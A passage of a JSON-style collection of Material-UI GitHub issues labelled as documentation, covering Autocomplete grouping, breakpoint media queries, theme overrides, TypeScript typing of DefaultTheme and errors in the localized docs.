duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\n## Expected Behavior 🤔\r\n\r\n<!-- Describe what should happen. -->\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\n\r\nSteps:\r\n\r\n1.\r\n2.\r\n3.\r\n4.\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with TypeScript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.11.0  |\r\n| React       |         |\r\n| Browser     |         |\r\n| TypeScript  |         |\r\n| etc.        |         |\r\n"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n#19121 was supposed to group options in groupBy automatically while right now a `.sort()` function has to be called in `options` prop on an array for it not to output a following warning: \r\n```\r\nMaterial-UI: The options provided combined with the `groupBy` method of Autocomplete returns duplicated headers. You can solve the issue by sorting the options with the output of `groupBy`.\r\n```\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\n## Expected Behavior 🤔\r\nMaybe the groupBy should sort an array internally by the provided option.\r\n<!-- Describe what should happen. -->\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n\r\n\r\n\r\n\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\n\r\nSteps:\r\n\r\n1. Add  on top of your file:\r\n```\r\nimport React from 'react'\r\nimport TextField from '@material-ui/core/TextField'\r\nimport Autocomplete from '@material-ui/lab/Autocomplete'\r\n```\r\n2. Create an Autocomplete component with TextField prefilled with an array of options then use `groupBy` prop of Autocomplete, for example: \r\n```\r\n<Autocomplete\r\n    id={`autocomplete-material-ui`}\r\n    options={[{group: 1, name: 'one'}, {group: 2, name: 'two'}, {group: 1, name: 'three'}, {group: 2, name: 'four'}, {group: 3, name: 'one'}]}\r\n    getOptionLabel={(option) => option.name}\r\n    groupBy={(option) => String(option.group)}\r\n    size=\"small\"\r\n    renderInput={(params) => {\r\n        return (\r\n            <TextField\r\n              {...params}\r\n              variant=\"outlined\"\r\n             />\r\n       )\r\n    }}\r\n/>        \r\n```\r\n\r\n## Context 🔦\r\nI am trying to get rid of a warning in a much easier way than pre-sorting an array each time. This can have its bright sides when someone wants to sort groups in a reversed manner or use a custom callback sorting function. I think the best solution would be to simply literally inform people in the docs of such prerequisites as the error message is not clear enough in my opinion to fix this warning right away (https://material-ui.com/components/autocomplete/#grouped). \r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with TypeScript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI/Core | v4.11.0  |\r\n| Material-UI/Lab | v4.0.0-alpha.56 |\r\n| React       |      ^16.13.1   |\r\n| TypeScript  |    ^3.9.7     |\r\n| Browser     |    Chrome     |\r\n\r\n"},{"labels":[null,null,"documentation"],"text":"According to the docs, `ButtonBase` no longer has a `type` prop (which had values `submit`, `reset`, and `button`). Is this a deliberate change, or a documentation bug?\r\n\r\nI'm asking because I'm generating MUI bindings from the docs. ButtonBase props are inherited by many other components, so I don't want to remove it unless it's intended."},{"labels":["documentation",null],"text":"- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nWhen I use this\r\n\r\n```javascript\r\nconst useStyles = makeStyles(theme =>\r\n  createStyles({\r\n    inner: {\r\n      color: \"blue\",\r\n      [theme.breakpoints.down(\"lg\")]: {\r\n        color: \"red\"\r\n      }\r\n    }\r\n  })\r\n);\r\n```\r\n\r\nthen the generated CSS is this:\r\n\r\n```CSS\r\n.makeStyles-inner-17 {\r\n  color: blue;\r\n}\r\n@media (max-width:1919.95px) {\r\n  .makeStyles-inner-17 {\r\n    color: red;\r\n  }\r\n}\r\n```\r\n\r\n## Expected Behavior 🤔\r\n\r\ntheme.breakpoints.value.lg equals 1280, so I expected the generated CSS to be like this:\r\n\r\n```CSS\r\n.makeStyles-inner-17 {\r\n  color: blue;\r\n}\r\n@media (max-width:1280px) {\r\n  .makeStyles-inner-17 {\r\n    color: red;\r\n  }\r\n}\r\n```\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nSandbox:\r\nhttps://codesandbox.io/s/nostalgic-frost-m8boc?file=/src/Demo.js\r\n\r\nSteps:\r\n\r\n1. Move the border between the source code and the right part of the screen called \"Browser\".\r\n2. Watch a red string that says \"The current window width is 1400 ... This string should be red when the width of the window is less than or equal to 1280.\"\r\n3. Move the border so that the window becomes wider than 1920\r\n4. Watch the displayed string turn to blue.\r\n\r\n## Context 🔦\r\n\r\nI am trying to design a responsive web page.\r\n\r\n## Your Environment 🌎\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.11.0  |\r\n"},{"labels":[null,"documentation",null],"text":"- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nAutocomplete does not always display options even if they are available.\r\n\r\n## Expected Behavior 🤔\r\n\r\nDisplay all options if available.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nSteps:\r\n\r\n1. visit [codesandbox](https://codesandbox.io/s/frosty-sara-zdg1x?file=/src/TerritoryTypeAhead.tsx).\r\n2. Type \"s\" and options are displayed.\r\n3. Type \"sc\" and options are not displayed.\r\n4. type \"columbia, s\" and options are not displayed \r\n\r\n## Context 🔦\r\n\r\nThe API is being mocked in the [codesandbox](https://codesandbox.io/s/frosty-sara-zdg1x?file=/src/TerritoryTypeAhead.tsx) with 4 options: \"s\", \"sc\", \"columbia, s\" and \"columbia, sc.\" In my environment it is a remote API call. The issue is consistent with queries to matches (or lack there of) but there doesn't seem to be any reason for which are displayed and which aren't, so far as I can tell.\r\n\r\n(Also, sorry about the TypeScript noise in the codesandbox.)\r\n\r\n<img width=\"801\" alt=\"Screen Shot 2020-07-21 at 1 37 26 AM\" src=\"https://user-images.githubusercontent.com/1073892/88017036-c8eb9480-caf2-11ea-92a5-16affdf60036.png\">\r\n\r\n<img width=\"932\" alt=\"Screen Shot 2020-07-20 at 11 47 25 PM\" src=\"https://user-images.githubusercontent.com/1073892/88016832-524e9700-caf2-11ea-9ce1-0032d47a1608.png\">\r\n\r\n\r\n## Your Environment 🌎\r\n\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.11.0  |\r\n| React       | v16.13.1 |\r\n| Browser     | Chrome v84.0.4147.89 |\r\n| TypeScript  | v3.7.5 |\r\n| Material-UI/lab | ^4.0.0-alpha.55 |\r\n\r\n\r\n### As an aside, thank you guys for the awesome library!"},{"labels":[null,"documentation"],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [ ] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nDemo crashes and requests I report the issue here.\r\n\r\n![image](https://user-images.githubusercontent.com/206973/87950352-2e993b80-ca75-11ea-9e93-e0f3df5360ce.png)\r\n\r\n\r\n## Expected Behavior 🤔\r\n\r\nDemo does something after clicking\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\n\r\nSteps:\r\n\r\n1. Go to https://next.material-ui.com/components/snackbars/#customized-snackbars\r\n2. Under Customized snackbars --> click Open Success Snackbar\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\nWant to see what Snackbar does in next.material-ui\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | next (whichever is on [next website](https://next.material-ui.com/components/snackbars/#customized-snackbars)) |\r\n| Browser     |     Chrome    |\r\n"},{"labels":["documentation",null],"text":"<!-- Provide a general summary of the feature in the Title above -->\r\nI am developing using material-ui. I am finding my self changing the template source code from function components to class components. I was wondering wondering if you guys considered creating some of the components class components?\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\n<!-- Describe how it should work. -->\r\nIn my use case, I am using child class components to search user data. User data is propagated downward to each child component that may need it (ex: fetch( back end api)). I like the way class components are used. I don't mind changing the code myself to class components. Wondered if it would be beneficial to include two versions of the code, one as a class component and function component. Leave it up to the user to decide which one to use! Moving them from function components to class components has also gotten rid of many warnings that I've received in the past moving from class component -> function component(material ui function) -> class component within my code.\r\n## Examples 🌈\r\n\r\n<!--\r\n  Provide a link to the Material design specification, other implementations,\r\n  or screenshots of the expected behavior.\r\n-->\r\nExample of TransitionModal transformed\r\n```js\r\nimport React from 'react';\r\nimport { withStyles } from '@material-ui/core/styles';\r\nimport Modal from '@material-ui/core/Modal';\r\nimport { Paper } from '@material-ui/core';\r\nimport PropTypes from 'prop-types'\r\n\r\nconst styles = theme => ({\r\n    modal: {\r\n      display: 'flex',\r\n      alignItems: 'center',\r\n      justifyContent: 'center',\r\n    },\r\n    paper: {\r\n      backgroundColor: theme.palette.background.paper,\r\n      border: '2px solid #000',\r\n      boxShadow: theme.shadows[5],\r\n      padding: theme.spacing(2, 4, 3),\r\n    },\r\n  });\r\n\r\nclass TransitionsModal extends React.Component {\r\n    constructor(props){\r\n        super(props)\r\n        this.state = {\r\n            open = false\r\n        }\r\n        this.handleClose = this.handleClose.bind(this)\r\n        this.handleOpen = this.handleOpen.bind(this)\r\n    }\r\n\r\n    handleOpen(){\r\n        this.setState({\r\n            open: true\r\n        })\r\n    }\r\n\r\n    handleClose(){\r\n        this.setState({\r\n            open: false\r\n        })\r\n    }\r\n\r\n    render() {\r\n        const {classes} = this.props;\r\n        return (\r\n            <div>\r\n                <button type=\"button\" onClick={this.handleOpen}>\r\n                    react-transition-group\r\n                </button>\r\n                <Modal\r\n                    aria-labelledby=\"transition-modal-title\"\r\n                    aria-describedby=\"transition-modal-description\"\r\n                    className={classes.modal}\r\n                    open={this.state.open}\r\n                    onClose={this.handleClose}\r\n                    closeAfterTransition\r\n                    BackdropComponent={Backdrop}\r\n                    BackdropProps={{\r\n                    timeout: 500,\r\n                    }}\r\n                >\r\n                    <Fade in={this.class.open}>\r\n                    <div className={classes.paper}>\r\n                        <h2 id=\"transition-modal-title\">Transition modal</h2>\r\n                        <p id=\"transition-modal-description\">react-transition-group animates me.</p>\r\n                    </div>\r\n                    </Fade>\r\n                </Modal>\r\n            </div>\r\n        )\r\n    }\r\n}\r\n\r\nTransitionsModal.propTypes = {\r\n    classes: PropTypes.object.isRequired\r\n  };\r\n\r\nexport default withStyles(styles)(TransitionsModal)\r\n```\r\n## Motivation 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has the lack of this feature affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\nI think it'd save developers time when they are taking code straight out of the box from the website. This is more of a quality of life improvement that I think users would find useful. If this is an idea that is worth implementing. Would you need open source heros to help out? I would be interested!"},{"labels":["documentation",null],"text":"In the documentation, it states that the 2nd argument of `createMuiTheme ` is an **array**, however, while working with it, it turns out to be an object which is merged with the final theme object.\r\n\r\n![image](https://user-images.githubusercontent.com/32180131/87268233-8967eb80-c4e7-11ea-96fb-b1c29eac6cda.png)\r\n\r\n![image](https://user-images.githubusercontent.com/32180131/87268771-e9ab5d00-c4e8-11ea-9927-859b2551c4b1.png)\r\n\r\n\r\nJust a suggestion, it would be great if createMuiTheme can take in a function with _default theme_ as the first argument, just for the purpose of re-using certain values or methods.\r\nFor Example:\r\n```\r\ncreateMuiTheme((theme) => ({\r\n  overrides: {\r\n    MuiIconButton: {\r\n      root: {\r\n        borderRadius: \"10px\",\r\n        [theme.breakpoints.down(\"sm\")]: { borderRadius: \"0\" },\r\n      },\r\n    },\r\n  },\r\n}));\r\n```"},{"labels":[null,null,"documentation"],"text":"When using `createMuiTheme`, along with `overrides`, we lose the context of the theme we customizing.\r\nHere's a quick codesandbox which demonstrates the issue and also the desired (optional) solution:\r\nhttps://codesandbox.io/s/jolly-aryabhata-8q37p\r\n\r\n```jsx\r\nconst theme = createMuiTheme({\r\n  shape: {\r\n    borderRadius: 4\r\n  },\r\n  overrides: {\r\n    MuiChip: {\r\n      root: {\r\n        borderRadius: 4\r\n      }\r\n    }\r\n  }\r\n  // this is what I would want\r\n  // overrides: (theme) => ({\r\n  //   MuiChip: {\r\n  //     root: {\r\n  //       borderRadius: theme.shape.borderRadius\r\n  //     }\r\n  //   }\r\n  // })\r\n});\r\n```\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate."},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\nWhen the TimeLineContent contains more text it is occupying more space. For TimeLine align(right and left) its okay. But for 'alternate' we can make the content to be at center so that it wont be occupying more  vertical space.\r\n\r\n[Sandbox URL](https://codesandbox.io/s/adoring-flower-97jz7?file=/demo.js)\r\n\r\n![timeline1JPG](https://user-images.githubusercontent.com/31988265/87085350-5c001100-c24d-11ea-9f8e-3a595e0c82a5.JPG)\r\n\r\nIf we can move the code a bit top(Not touching the above icon) and icon somewhat below to look like middle of the content which looks good and also it wont be awkward.\r\n\r\nIf moving the TimeLineContent above sides with the above template we can have a arrow to TimeLineContent to the Icon/dot.(I dont think is required as we can understand clearly if the icon is at middle of the content). This is just another suggestion.\r\n<!-- Describe how it should work. -->\r\n\r\n## Examples 🌈\r\n<!--\r\n  Provide a link to the Material design specification, other implementations,\r\n  or screenshots of the expected behavior.\r\n-->\r\nSomething Like this \r\n![image](https://user-images.githubusercontent.com/31988265/87087103-20b31180-c250-11ea-9ab0-b0272d5fa2a4.png)\r\n\r\n## Motivation 🔦\r\n<!--\r\n  What are you trying to accomplish? How has the lack of this feature affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nDocumentation has example of custom switches. The first one is purple. If you hover over thumb and look closer the ripple effect color isn't based on purple, but on default secondary color. You can also ensure that behavior is wrong by inspecting the element.\r\n\r\n## Expected Behavior 🤔\r\n\r\nExpecting ripple color on hover to be rgba(r, g, b, 0.04) where r,g,b is color from &$checked\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\n\r\nSteps:\r\n\r\n1. Go to https://material-ui.com/components/switches/ \r\n2. Scroll to the Customized switches\r\n3. Inspect purple thumb and its ripple color on hover\r\n4. (or copy Custom Switch, add any custom color and see that behavior is the same)\r\n\r\n## Context 🔦\r\n\r\nAs a VERY temporary solution this CSS rule may be used (change color for whatever you like): \r\n.MuiSwitch-colorSecondary.Mui-checked:hover {\r\n    background-color: rgba(55, 142, 60, 0.04) !important;\r\n}\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.9.14  |\r\n| React       | 16.11 |\r\n| Browser     | Chrome 83.0.4103.116 |\r\n| TypeScript  | - |\r\n| etc.        | - |\r\n"},{"labels":["documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [ ] The issue is present in the latest release.\r\n- [ ] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\n## Expected Behavior 🤔\r\n\r\n<!-- Describe what should happen. -->\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\n\r\nSteps:\r\n\r\n1.\r\n2.\r\n3.\r\n4.\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.?.?  |\r\n| React       |         |\r\n| Browser     |         |\r\n| TypeScript  |         |\r\n| etc.        |         |\r\n"},{"labels":[null,"documentation",null],"text":"Can we have things like this removed from the docs? [https://i.gyazo.com/93dc156541e3b7939022a4239747bd94.png](https://i.gyazo.com/93dc156541e3b7939022a4239747bd94.png)\r\n\r\nIt makes it hard to find components that we need I would suggest 1 element per example."},{"labels":[null,"documentation",null],"text":"\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [ x] The issue is present in the latest release.\r\n- [ x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nWhen I create a text field component with a helper text that is on the same line as a non helper text text field, the helper text pushed the field up. I would expect that I don't have to restyle this to make them line up again. I would expect the helper text to be positioned absolutely so that it doesn't affect the bounding box vertically, although it may be best to still allow it to change the width if need be.\r\n\r\n## Expected Behavior 🤔\r\n\r\nIf I have a text field with helper text and a text field without helper text on the same line, they should line up horizontally instead of the helper text pushing the first field up and out of alignment."},{"labels":["documentation"],"text":"There is an error in the Chinese document on the official website,\r\nBecause it is a small problem, and it is on the web,\r\nSo I didn’t submit issues according to the standard\r\nAt url:https://material-ui.com/zh/components/pickers/\r\nThe value of type is inconsistent in context\r\n\r\n\r\n![image](https://user-images.githubusercontent.com/21336637/86020049-ff854080-ba59-11ea-929c-ccc27ad26d17.png)\r\n\r\n"},{"labels":["documentation",null],"text":"We really love to work with Material UI, never the less we are having big trouble understanding all the colors in theme-pallets, and where they are used.\r\n\r\nFor example:\r\n1. we know the primary dark is used for button hovered state. but what else is it used for?\r\n2. We have actions like hover, active, pressed etc. We only could find the hover and active state. it would be great to know, why the focus state is not used for buttons.\r\n3. Where are the text object entries colors primary, secondary, disabled, hint used?\r\nWe would really appreciate if the docs would explain all the object entries.\r\n\r\nThank you very much"},{"labels":[null,"documentation"],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\nIn the Chinese document, the link to typography API at the end of Typography Components is incorrect which should be \"https://material-ui.com/zh/api/typography/\" not \"https://material-ui.com/zh/api/文字铸排/\"\r\n"},{"labels":["documentation"],"text":"Within the server [side rendering docs](https://material-ui.com/guides/server-rendering/) I would love to be notified that components like [Hidden](https://material-ui.com/components/hidden/#implementations) provide two implementations (js & css) which I can choose from"},{"labels":["documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [ x] The issue is present in the latest release.\r\n- [ x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\nWhen trying to utilize a color from my theme pallete inside a makeStyles, it says that DefaultTheme doesn``t have property 'palette', which is odd since I logged the theme object and it has said property.\r\nSo I went to the type definition of DefaultTheme in `node_modules/@material-ui/core/styles/defaultTheme/index.d.ts`  and notice that the type exported is in fact an empty object:\r\n```\r\n/**\r\n * The default theme interface, augment this to avoid having to set the theme type everywhere\r\n */\r\nexport interface DefaultTheme {}\r\n\r\n```\r\nWhy should I augment this interface instead of utilizing Theme directly?\r\n\r\n## Expected Behavior 🤔\r\n\r\nNo error.\r\n\r\n<!-- Describe what should happen. -->\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nhttps://codesandbox.io/s/modern-rain-h5n3m\r\n\r\n\r\n## Context 🔦\r\n\r\nI am using material-ui with Typescript (3.7.5) and I was trying to change the background color of a Divider to a color I have in a custom theme, so I tried to create a class using makeStyles. The problem is that when trying to access the palette property in the theme inside makeStyles, Typescript would give an error (ts 2339) saying that DefaultTheme doesn`t have the palette property.\r\n\r\nI have managed to fix the issue in my computer (but not on codesandbox) by importing `Theme`:\r\n```\r\n...\r\nimport {Theme} from \"@material-ui/core\";\r\n\r\nconst useStyles = makeStyles((theme: Theme) => ({\r\n    dividerColor: {\r\n        backgroundColor: theme.palette.secondary.main\r\n    }\r\n}));\r\n```\r\n\r\n## Your Environment 🌎\r\nI'm using the `tsconfig` from `create-react-app`:\r\n```\r\ntsconfig.json\r\n{\r\n  \"compilerOptions\": {\r\n    \"target\": \"es5\",\r\n    \"lib\": [\r\n      \"dom\",\r\n      \"dom.iterable\",\r\n      \"esnext\"\r\n    ],\r\n    \"allowJs\": true,\r\n    \"skipLibCheck\": true,\r\n    \"esModuleInterop\": true,\r\n    \"allowSyntheticDefaultImports\": true,\r\n    \"strict\": true,\r\n    \"forceConsistentCasingInFileNames\": true,\r\n    \"module\": \"esnext\",\r\n    \"moduleResolution\": \"node\",\r\n    \"resolveJsonModule\": true,\r\n    \"isolatedModules\": true,\r\n    \"noEmit\": true,\r\n    \"jsx\": \"react\"\r\n  },\r\n  \"include\": [\r\n    \"src\"\r\n  ]\r\n}\r\n\r\n```\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.10.2  |\r\n| React       | v16.13.1  |\r\n| TypeScript  | v3.7.5  |\r\n"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\n![Peek 16-06-2020 13-28](https://user-images.githubusercontent.com/20476002/84769079-94f1f080-afd5-11ea-90a0-232b68aa1ac5.gif)\r\n\r\n## Expected Behavior 🤔\r\n\r\n<!-- Describe what should happen. -->\r\nShould ensure that it does not even allow the insertion of the letter \"e\".\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.10.2  |\r\n| React       |   v16.13  |\r\n\r\n"},{"labels":["documentation",null],"text":"<!-- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\n<!-- Describe how it should work. -->\r\nInclude an example for virtualization with `Table` and `List` component using `react-virtual` in the docs.\r\n\r\n## Examples 🌈\r\n\r\nI quickly put together an example implementation.\r\n[codesandbox](https://codesandbox.io/s/github/tchmnn/react-virtual-material-ui-demo/tree/master/)\r\n\r\n## Motivation 🔦\r\n\r\nThe `List` and `Table` component docs include an example for usage with `react-window`.\r\nSince `react-window` doesn't support dynamically sized content out of the box (which I think is a pretty common use case) the docs could be enhanced to include an example using `react-virtual`, which supports that feature out of the box.\r\n\r\n"},{"labels":[null,"documentation",null],"text":"The issue was first reported by @jaironalves. We hard-code the link to the versions URL without taking the locale into account:\r\n\r\n- https://github.com/mui-org/material-ui/blob/68d1953fc09c0deb8a6bc4ba5202f9f35df514d5/docs/src/modules/components/AppFooter.js#L159\r\n- https://github.com/mui-org/material-ui/blob/68d1953fc09c0deb8a6bc4ba5202f9f35df514d5/docs/src/modules/components/AppDrawer.js#L156\r\n\r\nI don't know if we have a better alternative than:\r\n\r\n```diff\r\ndiff --git a/docs/src/modules/components/AppDrawer.js b/docs/src/modules/components/AppDrawer.js\r\nindex ead6ab7fa..d63d96294 100644\r\n--- a/docs/src/modules/components/AppDrawer.js\r\n+++ b/docs/src/modules/components/AppDrawer.js\r\n@@ -140,6 +140,8 @@ const iOS = process.browser && /iPad|iPhone|iPod/.test(navigator.userAgent);\r\n function AppDrawer(props) {\r\n   const { classes, className, disablePermanent, mobileOpen, onClose, onOpen } = props;\r\n   const { activePage, pages } = React.useContext(PageContext);\r\n+  const userLanguage = useSelector((state) => state.options.userLanguage);\r\n+  const languagePrefix = userLanguage === 'en' ? '' : `/${userLanguage}`;\r\n   